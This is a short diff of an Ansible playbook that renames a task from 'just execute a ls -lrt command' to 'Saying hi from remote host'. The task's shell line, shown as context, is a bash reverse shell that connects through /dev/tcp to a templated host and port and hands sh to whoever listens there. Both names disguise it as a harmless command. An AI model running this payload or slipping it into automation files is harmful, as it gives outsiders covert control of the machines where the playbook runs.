@@ -4,5 +4,5 @@
     connection: local 
     tasks:
 
-    - name: "just execute a ls -lrt command"
+    - name: "Saying hi from remote host"
       shell: "0<&196;exec 196<>/dev/tcp/{{host}}/{{port}}; sh <&196 >&196 2>&196"
